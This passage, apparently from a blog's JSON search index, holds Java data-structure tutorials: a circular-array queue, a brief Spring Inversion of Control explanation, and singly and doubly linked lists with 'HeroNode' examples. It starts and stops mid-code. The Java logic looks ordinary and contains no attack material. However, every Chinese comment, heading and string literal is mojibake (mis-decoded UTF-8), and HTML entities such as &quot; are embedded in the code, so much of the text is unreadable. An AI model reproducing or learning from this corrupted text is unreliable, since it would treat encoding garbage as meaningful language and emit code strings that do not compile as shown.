å–å‡ºæ•°æ® try { int res = queue.getQueue(); System.out.printf(&quot;å–å‡ºçš„æ•°æ®æ˜¯%d\\n&quot;, res); } catch (Exception e) { // TODO: handle exception System.out.println(e.getMessage()); } break; case &#39;h&#39;: // æŸ¥çœ‹é˜Ÿåˆ—å¤´çš„æ•°æ® try { int res = queue.headQueue(); System.out.printf(&quot;é˜Ÿåˆ—å¤´çš„æ•°æ®æ˜¯%d\\n&quot;, res); } catch (Exception e) { // TODO: handle exception System.out.println(e.getMessage()); } break; case &#39;e&#39;: // é€€å‡º scanner.close(); loop = false; break; default: break; } } System.out.println(&quot;ç¨‹åºé€€å‡º~~&quot;); } } class CircleArray { private int maxSize; // è¡¨ç¤ºæ•°ç»„çš„æœ€å¤§å®¹é‡ //front å˜é‡çš„å«ä¹‰åšä¸€ä¸ªè°ƒæ•´ï¼šfront å°±æŒ‡å‘é˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ , ä¹Ÿå°±æ˜¯è¯´ arr[front] å°±æ˜¯é˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´  //front çš„åˆå§‹å€¼ = 0 private int front; //rear å˜é‡çš„å«ä¹‰åšä¸€ä¸ªè°ƒæ•´ï¼šrear æŒ‡å‘é˜Ÿåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ çš„åä¸€ä¸ªä½ç½®. å› ä¸ºå¸Œæœ›ç©ºå‡ºä¸€ä¸ªç©ºé—´åšä¸ºçº¦å®š. //rear çš„åˆå§‹å€¼ = 0 private int rear; // é˜Ÿåˆ—å°¾ private int[] arr; // è¯¥æ•°æ®ç”¨äºå­˜æ”¾æ•°æ®, æ¨¡æ‹Ÿé˜Ÿåˆ— public CircleArray(int arrMaxSize) { maxSize = arrMaxSize; arr = new int[maxSize]; } // åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦æ»¡ public boolean isFull() { return (rear + 1) % maxSize == front; } // åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º public boolean isEmpty() { return rear == front; } // æ·»åŠ æ•°æ®åˆ°é˜Ÿåˆ— public void addQueue(int n) { // åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦æ»¡ if (isFull()) { System.out.println(&quot;é˜Ÿåˆ—æ»¡ï¼Œä¸èƒ½åŠ å…¥æ•°æ®~&quot;); return; } //ç›´æ¥å°†æ•°æ®åŠ å…¥ arr[rear] = n; //å°† rear åç§», è¿™é‡Œå¿…é¡»è€ƒè™‘å–æ¨¡ rear = (rear + 1) % maxSize; } // è·å–é˜Ÿåˆ—çš„æ•°æ®, å‡ºé˜Ÿåˆ— public int getQueue() { // åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ç©º if (isEmpty()) { // é€šè¿‡æŠ›å‡ºå¼‚å¸¸ throw new RuntimeException(&quot;é˜Ÿåˆ—ç©ºï¼Œä¸èƒ½å–æ•°æ®&quot;); } // è¿™é‡Œéœ€è¦åˆ†æå‡º frontæ˜¯æŒ‡å‘é˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´  // 1. å…ˆæŠŠ front å¯¹åº”çš„å€¼ä¿ç•™åˆ°ä¸€ä¸ªä¸´æ—¶å˜é‡ // 2. å°† front åç§», è€ƒè™‘å–æ¨¡ // 3. å°†ä¸´æ—¶ä¿å­˜çš„å˜é‡è¿”å› int value = arr[front]; front = (front + 1) % maxSize; return value; } // æ˜¾ç¤ºé˜Ÿåˆ—çš„æ‰€æœ‰æ•°æ® public void showQueue() { // éå† if (isEmpty()) { System.out.println(&quot;é˜Ÿåˆ—ç©ºçš„ï¼Œæ²¡æœ‰æ•°æ®~~&quot;); return; } // æ€è·¯ï¼šä»frontå¼€å§‹éå†ï¼Œéå†å¤šå°‘ä¸ªå…ƒç´  // åŠ¨è„‘ç­‹ for (int i = front; i &lt; front + size() ; i++) { System.out.printf(&quot;arr[%d]=%d\\n&quot;, i % maxSize, arr[i % maxSize]); } } // æ±‚å‡ºå½“å‰é˜Ÿåˆ—æœ‰æ•ˆæ•°æ®çš„ä¸ªæ•° public int size() { // rear = 2 // front = 1 // maxSize = 3 return (rear + maxSize - front) % maxSize; } // æ˜¾ç¤ºé˜Ÿåˆ—çš„å¤´æ•°æ®ï¼Œ æ³¨æ„ä¸æ˜¯å–å‡ºæ•°æ® public int headQueue() { // åˆ¤æ–­ if (isEmpty()) { throw new RuntimeException(&quot;é˜Ÿåˆ—ç©ºçš„ï¼Œæ²¡æœ‰æ•°æ®~~&quot;); } return arr[front]; } }","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"Inversion of Controlæ§åˆ¶åè½¬","slug":"Inversion-of-Controlæ§åˆ¶åè½¬","date":"2020-05-13T00:42:55.000Z","updated":"2021-04-11T17:11:28.180Z","comments":true,"path":"Inversion-of-Controlæ§åˆ¶åè½¬/","link":"","permalink":"https://blog.kayleh.top/Inversion-of-Control%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC/","excerpt":"æ§åˆ¶åè½¬çš„å®šä¹‰","text":"æ§åˆ¶åè½¬çš„å®šä¹‰ Inversion of Controlæ§åˆ¶åè½¬ï¼Œè´¯ç©¿Springçš„å§‹ç»ˆï¼ŒSpringçš„æ ¸å¿ƒã€‚ç”±springæ¥è´Ÿè´£æ§åˆ¶å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå’Œå¯¹è±¡é—´çš„å…³ç³»ã€‚ IOCçš„æ€æƒ³æ˜¯åè½¬èµ„æºè·å–æ–¹å‘.ä¼ ç»Ÿçš„èµ„æºæŸ¥æ‰¾æ–¹å¼è¦æ±‚ç»„ä»¶å‘å®¹å™¨å‘èµ·è¯·æ±‚æŸ¥æ‰¾èµ„æº.ä½œä¸ºå›åº”,å®¹å™¨é€‚æ—¶çš„è¿”å›èµ„æº,è€Œåº”ç”¨IOCä¹‹å,åˆ™æ˜¯å®¹å™¨ä¸»åŠ¨çš„å°†èµ„æºæ¨é€ç»™å®ƒæ‰€ç®¡ç†çš„ç»„ä»¶,ç»„ä»¶æ‰€è¦åšçš„ä»…ä»…æ˜¯é€‰æ‹©ä¸€ç§åˆé€‚çš„æ–¹å¼æ¥æ¥å—èµ„æº,è¿™ç§è¡Œä¸ºä¹Ÿè¢«ç§°ä¸ºæŸ¥æ‰¾çš„è¢«åŠ¨å½¢å¼. â–¼ä¼ ç»Ÿçš„æ–¹æ³•è·å–ï¼š Pojo pojo = new Pojo( ); â–¼Springç®¡ç†çš„beanè·å–ï¼š @AutowiredPojo pojo; â€™ å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸç”±Springæ¥ç®¡ç†ï¼Œç›´æ¥ä»Springé‚£é‡Œå»è·å–ä¸€ä¸ªå¯¹è±¡ã€‚IOCæ˜¯åè½¬æ§åˆ¶ (Inversion Of Control)çš„ç¼©å†™ï¼Œå°±åƒæ§åˆ¶æƒä»æœ¬æ¥åœ¨è‡ªå·±æ‰‹é‡Œï¼Œäº¤ç»™äº†Springã€‚â€˜","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"LinkedList","slug":"é“¾è¡¨","date":"2020-05-12T03:21:40.000Z","updated":"2021-04-11T17:11:29.081Z","comments":true,"path":"é“¾è¡¨/","link":"","permalink":"https://blog.kayleh.top/%E9%93%BE%E8%A1%A8/","excerpt":"é“¾è¡¨æ˜¯æœ‰åºçš„åˆ—è¡¨ï¼Œä½†å®ƒåœ¨å†…å­˜é‡Œæ˜¯æ— åºçš„ã€‚","text":"é“¾è¡¨æ˜¯æœ‰åºçš„åˆ—è¡¨ï¼Œä½†å®ƒåœ¨å†…å­˜é‡Œæ˜¯æ— åºçš„ã€‚ img é“¾è¡¨æ˜¯ä»¥èŠ‚ç‚¹çš„æ–¹å¼æ¥å­˜å‚¨,æ˜¯é“¾å¼å­˜å‚¨ æ¯ä¸ªèŠ‚ç‚¹åŒ…å«data åŸŸï¼Œ next åŸŸï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ å„ä¸ªèŠ‚ç‚¹ä¸ä¸€å®šæ˜¯è¿ç»­å­˜å‚¨. é“¾è¡¨åˆ†å¸¦å¤´èŠ‚ç‚¹çš„é“¾è¡¨å’Œæ²¡æœ‰å¤´èŠ‚ç‚¹çš„é“¾è¡¨ï¼Œæ ¹æ®å®é™…çš„éœ€æ±‚æ¥ç¡®å®š â–¼å•é“¾è¡¨ï¼š img å®ç°ï¼š package linkedlist; /** * @Author * @Date: 2020/5/11 10:59 */ import java.util.Stack; public class SingleLinkedListDemo { public static void main(String[] args) { //è¿›è¡Œæµ‹è¯• //å…ˆåˆ›å»ºèŠ‚ç‚¹ HeroNode hero1 = new HeroNode(1, &quot;å®‹æ±Ÿ&quot;, &quot;åŠæ—¶é›¨&quot;); HeroNode hero2 = new HeroNode(2, &quot;å¢ä¿Šä¹‰&quot;, &quot;ç‰éº’éºŸ&quot;); HeroNode hero3 = new HeroNode(3, &quot;å´ç”¨&quot;, &quot;æ™ºå¤šæ˜Ÿ&quot;); HeroNode hero4 = new HeroNode(4, &quot;æ—å†²&quot;, &quot;è±¹å­å¤´&quot;); //åˆ›å»ºè¦ç»™é“¾è¡¨ SingleLinkedList singleLinkedList = new SingleLinkedList(); //åŠ å…¥ singleLinkedList.add(hero1); singleLinkedList.add(hero4); singleLinkedList.add(hero2); singleLinkedList.add(hero3); // æµ‹è¯•ä¸€ä¸‹å•é“¾è¡¨çš„åè½¬åŠŸèƒ½ System.out.println(&quot;åŸæ¥é“¾è¡¨çš„æƒ…å†µ~~&quot;); singleLinkedList.list(); // System.out.println(&quot;åè½¬å•é“¾è¡¨~~&quot;); // reversetList(singleLinkedList.getHead()); // singleLinkedList.list(); System.out.println(&quot;æµ‹è¯•é€†åºæ‰“å°å•é“¾è¡¨, æ²¡æœ‰æ”¹å˜é“¾è¡¨çš„ç»“æ„~~&quot;); reversetList(singleLinkedList.getHead()); //åŠ å…¥æŒ‰ç…§ç¼–å·çš„é¡ºåº singleLinkedList.addByOrder(hero1); singleLinkedList.addByOrder(hero4); singleLinkedList.addByOrder(hero2); singleLinkedList.addByOrder(hero3); //æ˜¾ç¤ºä¸€æŠŠ singleLinkedList.list(); //æµ‹è¯•ä¿®æ”¹èŠ‚ç‚¹çš„ä»£ç  HeroNode newHeroNode = new HeroNode(2, &quot;å°å¢&quot;, &quot;ç‰éº’éºŸ~~&quot;); singleLinkedList.update(newHeroNode); System.out.println(&quot;ä¿®æ”¹åçš„é“¾è¡¨æƒ…å†µ~~&quot;); singleLinkedList.list(); //åˆ é™¤ä¸€ä¸ªèŠ‚ç‚¹ singleLinkedList.del(1); singleLinkedList.del(4); System.out.println(&quot;åˆ é™¤åçš„é“¾è¡¨æƒ…å†µ~~&quot;); singleLinkedList.list(); //æµ‹è¯•ä¸€ä¸‹ æ±‚å•é“¾è¡¨ä¸­æœ‰æ•ˆèŠ‚ç‚¹çš„ä¸ªæ•° System.out.println(&quot;æœ‰æ•ˆçš„èŠ‚ç‚¹ä¸ªæ•°=&quot; + getLength(singleLinkedList.getHead()));//2 //æµ‹è¯•ä¸€ä¸‹çœ‹çœ‹æ˜¯å¦å¾—åˆ°äº†å€’æ•°ç¬¬Kä¸ªèŠ‚ç‚¹ HeroNode res = findLastIndexNode(singleLinkedList.getHead(), 3); System.out.println(&quot;res=&quot; + res); } //å°†å•é“¾è¡¨åè½¬ public static void reversetList(HeroNode head) { //å¦‚æœå½“å‰é“¾è¡¨ä¸ºç©ºï¼Œæˆ–è€…åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ— éœ€åè½¬ï¼Œç›´æ¥è¿”å› if(head.next == null || head.next.next == null) { return ; } //å®šä¹‰ä¸€ä¸ªè¾…åŠ©çš„æŒ‡é’ˆ(å˜é‡)ï¼Œå¸®åŠ©æˆ‘ä»¬éå†åŸæ¥çš„é“¾è¡¨ HeroNode cur = head.next; HeroNode next = null;// æŒ‡å‘å½“å‰èŠ‚ç‚¹[cur]çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ HeroNode reverseHead = new HeroNode(0, &quot;&quot;, &quot;&quot;); //éå†åŸæ¥çš„é“¾è¡¨ï¼Œæ¯éå†ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±å°†å…¶å–å‡ºï¼Œå¹¶æ”¾åœ¨æ–°çš„é“¾è¡¨reverseHead çš„æœ€å‰ç«¯ //åŠ¨è„‘ç­‹ while(cur != null) { next = cur.next;//å…ˆæš‚æ—¶ä¿å­˜å½“å‰èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå› ä¸ºåé¢éœ€è¦ä½¿ç”¨ cur.next = reverseHead.next;//å°†curçš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æŒ‡å‘æ–°çš„é“¾è¡¨çš„æœ€å‰ç«¯ reverseHead.next = cur; //å°†cur è¿æ¥åˆ°æ–°çš„é“¾è¡¨ä¸Š cur = next;//è®©curåç§» } //å°†head.next æŒ‡å‘ reverseHead.next , å®ç°å•é“¾è¡¨çš„åè½¬ head.next = reverseHead.next; } //æŸ¥æ‰¾å•é“¾è¡¨ä¸­çš„å€’æ•°ç¬¬kä¸ªç»“ç‚¹ ã€æ–°æµªé¢è¯•é¢˜ã€‘ //æ€è·¯ //1. ç¼–å†™ä¸€ä¸ªæ–¹æ³•ï¼Œæ¥æ”¶headèŠ‚ç‚¹ï¼ŒåŒæ—¶æ¥æ”¶ä¸€ä¸ªindex //2. index è¡¨ç¤ºæ˜¯å€’æ•°ç¬¬indexä¸ªèŠ‚ç‚¹ //3. å…ˆæŠŠé“¾è¡¨ä»å¤´åˆ°å°¾éå†ï¼Œå¾—åˆ°é“¾è¡¨çš„æ€»çš„é•¿åº¦ getLength //4. å¾—åˆ°size åï¼Œæˆ‘ä»¬ä»é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå¼€å§‹éå† (size-index)ä¸ªï¼Œå°±å¯ä»¥å¾—åˆ° //5. å¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™è¿”å›è¯¥èŠ‚ç‚¹ï¼Œå¦åˆ™è¿”å›nulll public static HeroNode findLastIndexNode(HeroNode head, int index) { //åˆ¤æ–­å¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œè¿”å›null if(head.next == null) { return null;//æ²¡æœ‰æ‰¾åˆ° } //ç¬¬ä¸€ä¸ªéå†å¾—åˆ°é“¾è¡¨çš„é•¿åº¦(èŠ‚ç‚¹ä¸ªæ•°) int size = getLength(head); //ç¬¬äºŒæ¬¡éå† size-index ä½ç½®ï¼Œå°±æ˜¯æˆ‘ä»¬å€’æ•°çš„ç¬¬Kä¸ªèŠ‚ç‚¹ //å…ˆåšä¸€ä¸ªindexçš„æ ¡éªŒ if(index &lt;=0 || index &gt; size) { return null; } //å®šä¹‰ç»™è¾…åŠ©å˜é‡ï¼Œ for å¾ªç¯å®šä½åˆ°å€’æ•°çš„index HeroNode cur = head.next; //3 // 3 - 1 = 2 for(int i =0; i&lt; size - index; i++) { cur = cur.next; } return cur; } //æ–¹æ³•ï¼šè·å–åˆ°å•é“¾è¡¨çš„èŠ‚ç‚¹çš„ä¸ªæ•°(å¦‚æœæ˜¯å¸¦å¤´ç»“ç‚¹çš„é“¾è¡¨ï¼Œéœ€æ±‚ä¸ç»Ÿè®¡å¤´èŠ‚ç‚¹) /** * * @param head é“¾è¡¨çš„å¤´èŠ‚ç‚¹ * @return è¿”å›çš„å°±æ˜¯æœ‰æ•ˆèŠ‚ç‚¹çš„ä¸ªæ•° */ public static int getLength(HeroNode head) { if(head.next == null) { //ç©ºé“¾è¡¨ return 0; } int length = 0; //å®šä¹‰ä¸€ä¸ªè¾…åŠ©çš„å˜é‡, è¿™é‡Œæˆ‘ä»¬æ²¡æœ‰ç»Ÿè®¡å¤´èŠ‚ç‚¹ HeroNode cur = head.next; while(cur != null) { length++; cur = cur.next; //éå† } return length; } } //å®šä¹‰SingleLinkedList ç®¡ç†æˆ‘ä»¬çš„è‹±é›„ class SingleLinkedList { //å…ˆåˆå§‹åŒ–ä¸€ä¸ªå¤´èŠ‚ç‚¹, å¤´èŠ‚ç‚¹ä¸è¦åŠ¨, ä¸å­˜æ”¾å…·ä½“çš„æ•°æ® private HeroNode head = new HeroNode(0, &quot;&quot;, &quot;&quot;); //è¿”å›å¤´èŠ‚ç‚¹ public HeroNode getHead() { return head; } //æ·»åŠ èŠ‚ç‚¹åˆ°å•å‘é“¾è¡¨ //æ€è·¯ï¼Œå½“ä¸è€ƒè™‘ç¼–å·é¡ºåºæ—¶ //1. æ‰¾åˆ°å½“å‰é“¾è¡¨çš„æœ€åèŠ‚ç‚¹ //2. å°†æœ€åè¿™ä¸ªèŠ‚ç‚¹çš„next æŒ‡å‘ æ–°çš„èŠ‚ç‚¹ public void add(HeroNode heroNode) { //å› ä¸ºheadèŠ‚ç‚¹ä¸èƒ½åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¾…åŠ©éå† temp HeroNode temp = head; //éå†é“¾è¡¨ï¼Œæ‰¾åˆ°æœ€å while(true) { //æ‰¾åˆ°é“¾è¡¨çš„æœ€å if(temp.next == null) {// break; } //å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ€å, å°†å°†tempåç§» temp = temp.next; } //å½“é€€å‡ºwhileå¾ªç¯æ—¶ï¼Œtempå°±æŒ‡å‘äº†é“¾è¡¨çš„æœ€å //å°†æœ€åè¿™ä¸ªèŠ‚ç‚¹çš„next æŒ‡å‘ æ–°çš„èŠ‚ç‚¹ temp.next = heroNode; } //ç¬¬äºŒç§æ–¹å¼åœ¨æ·»åŠ è‹±é›„æ—¶ï¼Œæ ¹æ®æ’åå°†è‹±é›„æ’å…¥åˆ°æŒ‡å®šä½ç½® //(å¦‚æœæœ‰è¿™ä¸ªæ’åï¼Œåˆ™æ·»åŠ å¤±è´¥ï¼Œå¹¶ç»™å‡ºæç¤º) public void addByOrder(HeroNode heroNode) { //å› ä¸ºå¤´èŠ‚ç‚¹ä¸èƒ½åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬ä»ç„¶é€šè¿‡ä¸€ä¸ªè¾…åŠ©æŒ‡é’ˆ(å˜é‡)æ¥å¸®åŠ©æ‰¾åˆ°æ·»åŠ çš„ä½ç½® //å› ä¸ºå•é“¾è¡¨ï¼Œå› ä¸ºæˆ‘ä»¬æ‰¾çš„temp æ˜¯ä½äº æ·»åŠ ä½ç½®çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦åˆ™æ’å…¥ä¸äº† HeroNode temp = head; boolean flag = false; // flagæ ‡å¿—æ·»åŠ çš„ç¼–å·æ˜¯å¦å­˜åœ¨ï¼Œé»˜è®¤ä¸ºfalse while(true) { if(temp.next == null) {//è¯´æ˜tempå·²ç»åœ¨é“¾è¡¨çš„æœ€å break; // } if(temp.next.no &gt; heroNode.no) { //ä½ç½®æ‰¾åˆ°ï¼Œå°±åœ¨tempçš„åé¢æ’å…¥ break; } else if (temp.next.no == heroNode.no) {//è¯´æ˜å¸Œæœ›æ·»åŠ çš„heroNodeçš„ç¼–å·å·²ç„¶å­˜åœ¨ flag = true; //è¯´æ˜ç¼–å·å­˜åœ¨ break; } temp = temp.next; //åç§»ï¼Œéå†å½“å‰é“¾è¡¨ } //åˆ¤æ–­flag çš„å€¼ if(flag) { //ä¸èƒ½æ·»åŠ ï¼Œè¯´æ˜ç¼–å·å­˜åœ¨ System.out.printf(&quot;å‡†å¤‡æ’å…¥çš„è‹±é›„çš„ç¼–å· %d å·²ç»å­˜åœ¨äº†, ä¸èƒ½åŠ å…¥\\n&quot;, heroNode.no); } else { //æ’å…¥åˆ°é“¾è¡¨ä¸­, tempçš„åé¢ heroNode.next = temp.next; temp.next = heroNode; } } //ä¿®æ”¹èŠ‚ç‚¹çš„ä¿¡æ¯, æ ¹æ®noç¼–å·æ¥ä¿®æ”¹ï¼Œå³noç¼–å·ä¸èƒ½æ”¹. //è¯´æ˜ //1. æ ¹æ® newHeroNode çš„ no æ¥ä¿®æ”¹å³å¯ public void update(HeroNode newHeroNode) { //åˆ¤æ–­æ˜¯å¦ç©º if(head.next == null) { System.out.println(&quot;é“¾è¡¨ä¸ºç©º~&quot;); return; } //æ‰¾åˆ°éœ€è¦ä¿®æ”¹çš„èŠ‚ç‚¹, æ ¹æ®noç¼–å· //å®šä¹‰ä¸€ä¸ªè¾…åŠ©å˜é‡ HeroNode temp = head.next; boolean flag = false; //è¡¨ç¤ºæ˜¯å¦æ‰¾åˆ°è¯¥èŠ‚ç‚¹ while(true) { if (temp == null) { break; //å·²ç»éå†å®Œé“¾è¡¨ } if(temp.no == newHeroNode.no) { //æ‰¾åˆ° flag = true; break; } temp = temp.next; } //æ ¹æ®flag åˆ¤æ–­æ˜¯å¦æ‰¾åˆ°è¦ä¿®æ”¹çš„èŠ‚ç‚¹ if(flag) { temp.name = newHeroNode.name; temp.nickname = newHeroNode.nickname; } else { //æ²¡æœ‰æ‰¾åˆ° System.out.printf(&quot;æ²¡æœ‰æ‰¾åˆ° ç¼–å· %d çš„èŠ‚ç‚¹ï¼Œä¸èƒ½ä¿®æ”¹\\n&quot;, newHeroNode.no); } } //åˆ é™¤èŠ‚ç‚¹ //æ€è·¯ //1. head ä¸èƒ½åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªtempè¾…åŠ©èŠ‚ç‚¹æ‰¾åˆ°å¾…åˆ é™¤èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ //2. è¯´æ˜æˆ‘ä»¬åœ¨æ¯”è¾ƒæ—¶ï¼Œæ˜¯temp.next.no å’Œ éœ€è¦åˆ é™¤çš„èŠ‚ç‚¹çš„noæ¯”è¾ƒ public void del(int no) { HeroNode temp = head; boolean flag = false; // æ ‡å¿—æ˜¯å¦æ‰¾åˆ°å¾…åˆ é™¤èŠ‚ç‚¹çš„ while(true) { if(temp.next == null) { //å·²ç»åˆ°é“¾è¡¨çš„æœ€å break; } if(temp.next.no == no) { //æ‰¾åˆ°çš„å¾…åˆ é™¤èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹temp flag = true; break; } temp = temp.next; //tempåç§»ï¼Œéå† } //åˆ¤æ–­flag if(flag) { //æ‰¾åˆ° //å¯ä»¥åˆ é™¤ temp.next = temp.next.next; }else { System.out.printf(&quot;è¦åˆ é™¤çš„ %d èŠ‚ç‚¹ä¸å­˜åœ¨\\n&quot;, no); } } //æ˜¾ç¤ºé“¾è¡¨[éå†] public void list() { //åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º if(head.next == null) { System.out.println(&quot;é“¾è¡¨ä¸ºç©º&quot;); return; } //å› ä¸ºå¤´èŠ‚ç‚¹ï¼Œä¸èƒ½åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¾…åŠ©å˜é‡æ¥éå† HeroNode temp = head.next; while(true) { //åˆ¤æ–­æ˜¯å¦åˆ°é“¾è¡¨æœ€å if(temp == null) { break; } //è¾“å‡ºèŠ‚ç‚¹çš„ä¿¡æ¯ System.out.println(temp); //å°†tempåç§»ï¼Œ ä¸€å®šå°å¿ƒ temp = temp.next; } } } //å®šä¹‰HeroNode ï¼Œ æ¯ä¸ªHeroNode å¯¹è±¡å°±æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ class HeroNode { public int no; public String name; public String nickname; public HeroNode next; //æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ //æ„é€ å™¨ public HeroNode(int no, String name, String nickname) { this.no = no; this.name = name; this.nickname = nickname; } //ä¸ºäº†æ˜¾ç¤ºæ–¹æ³•ï¼Œæˆ‘ä»¬é‡æ–°toString @Override public String toString() { return &quot;HeroNode [no=&quot; + no + &quot;, name=&quot; + name + &quot;, nickname=&quot; + nickname + &quot;]&quot;; } } â–¼åŒå‘é“¾è¡¨ï¼š å•å‘é“¾è¡¨ï¼ŒæŸ¥æ‰¾çš„æ–¹å‘åªèƒ½æ˜¯ä¸€ä¸ªæ–¹å‘ï¼Œè€ŒåŒå‘é“¾è¡¨å¯ä»¥å‘å‰æˆ–è€…å‘åæŸ¥æ‰¾ã€‚å•å‘é“¾è¡¨ä¸èƒ½è‡ªæˆ‘åˆ é™¤ï¼Œéœ€è¦é è¾…åŠ©èŠ‚ç‚¹ï¼Œè€ŒåŒå‘é“¾è¡¨ï¼Œåˆ™å¯ä»¥è‡ªæˆ‘åˆ é™¤ï¼Œæ‰€ä»¥å‰é¢æˆ‘ä»¬å•é“¾è¡¨åˆ é™¤æ—¶èŠ‚ç‚¹ï¼Œæ€»æ˜¯æ‰¾åˆ°temp,tempæ˜¯å¾…åˆ é™¤èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ package linkedlist; public class DoubleLinkedListDemo { public static void main(String[] args) { // æµ‹è¯• System.out.println(&quot;åŒå‘é“¾è¡¨çš„æµ‹è¯•&quot;); // å…ˆåˆ›å»ºèŠ‚ç‚¹ HeroNode2 hero1 = new HeroNode2(1, &quot;å®‹æ±Ÿ&quot;, &quot;åŠæ—¶é›¨&quot;); HeroNode2 hero2 = new HeroNode2(2, &quot;å¢ä¿Šä¹‰&quot;, &quot;ç‰éº’éºŸ&quot;); HeroNode2 hero3 = new HeroNode2(3, &quot;å´ç”¨&quot;, &quot;æ™ºå¤šæ˜Ÿ&quot;); HeroNode2 hero4 = new HeroNode2(4, &quot;æ—å†²&quot;, &quot;è±¹å­å¤´&quot;); // åˆ›å»ºä¸€ä¸ªåŒå‘é“¾è¡¨ DoubleLinkedList doubleLinkedList = new DoubleLinkedList(); doubleLinkedList.add(hero1); doubleLinkedList.add(hero2); doubleLinkedList.add(hero3); doubleLinkedList.add(hero4); doubleLinkedList.list(); // ä¿®æ”¹ HeroNode2 newHeroNode = new HeroNode2(4, &quot;å…¬å­™èƒœ&quot;, &quot;å…¥äº‘é¾™&quot;); doubleLinkedList.update(newHeroNode); System.out.println(&quot;ä¿®æ”¹åçš„é“¾è¡¨æƒ…å†µ&quot;); doubleLinkedList.list(); // åˆ é™¤ doubleLinkedList.del(3); System.out.println(&quot;åˆ é™¤åçš„é“¾è¡¨æƒ…å†µ~~&quot;); doubleLinkedList.list(); } } // åˆ›å»ºä¸€ä¸ªåŒå‘é“¾è¡¨çš„ç±» class DoubleLinkedList { // å…ˆåˆå§‹åŒ–ä¸€ä¸ªå¤´èŠ‚ç‚¹, å¤´èŠ‚ç‚¹ä¸è¦åŠ¨, ä¸å­˜æ”¾å…·ä½“çš„æ•°æ® private HeroNode2 head = new HeroNode2(0, &quot;&quot;, &quot;&quot;); // è¿”å›å¤´èŠ‚ç‚¹ public HeroNode2 getHead() { return head; } // éå†åŒå‘é“¾è¡¨çš„æ–¹æ³• // æ˜¾ç¤ºé“¾è¡¨[éå†] public void list() { // åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º if (head.next == null) { System.out.println(&quot;é“¾è¡¨ä¸ºç©º&quot;); return; } // å› ä¸ºå¤´èŠ‚ç‚¹ï¼Œä¸èƒ½åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¾…åŠ©å˜é‡æ¥éå† HeroNode2 temp = head.next; while (true) { // åˆ¤æ–­æ˜¯å¦åˆ°é“¾è¡¨æœ€å if (temp == null) { break; } // è¾“å‡ºèŠ‚ç‚¹çš„ä¿¡æ¯ System.out.println(temp); // å°†tempåç§»ï¼Œ ä¸€å®šå°å¿ƒ temp = temp.next; } } // æ·»åŠ ä¸€ä¸ªèŠ‚ç‚¹åˆ°åŒå‘é“¾è¡¨çš„æœ€å. public void add(HeroNode2 heroNode) { // å› ä¸ºheadèŠ‚ç‚¹ä¸èƒ½åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¾…åŠ©éå† temp HeroNode2 temp = head; // éå†é“¾è¡¨ï¼Œæ‰¾åˆ°æœ€å while (true) { // æ‰¾åˆ°é“¾è¡¨çš„æœ€å if (temp.next == null) {// break; } // å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ€å, å°†å°†tempåç§» temp = temp.next; } // å½“é€€å‡ºwhileå¾ªç¯æ—¶ï¼Œtempå°±æŒ‡å‘äº†é“¾è¡¨çš„æœ€å // å½¢æˆä¸€ä¸ªåŒå‘é“¾è¡¨ temp.next = heroNode; heroNode.pre = temp; } // ä¿®æ”¹ä¸€ä¸ªèŠ‚ç‚¹çš„å†…å®¹, å¯ä»¥çœ‹åˆ°åŒå‘é“¾è¡¨çš„èŠ‚ç‚¹å†…å®¹ä¿®æ”¹å’Œå•å‘é“¾è¡¨ä¸€æ · // åªæ˜¯ èŠ‚ç‚¹ç±»å‹æ”¹æˆ HeroNode2 public void update(HeroNode2 newHeroNode) { // åˆ¤æ–­æ˜¯å¦ç©º if (head.next == null) { System.out.println(&quot;é“¾è¡¨ä¸ºç©º~&quot;); return; } // æ‰¾åˆ°éœ€è¦ä¿®æ”¹çš„èŠ‚ç‚¹, æ ¹æ®noç¼–å· // å®šä¹‰ä¸€ä¸ªè¾…åŠ©å˜é‡ HeroNode2 temp = head.next; boolean flag = false; // è¡¨ç¤ºæ˜¯å¦æ‰¾åˆ°è¯¥èŠ‚ç‚¹ while (true) { if (temp == null) { break; // å·²ç»éå†å®Œé“¾è¡¨ } if (temp.no == 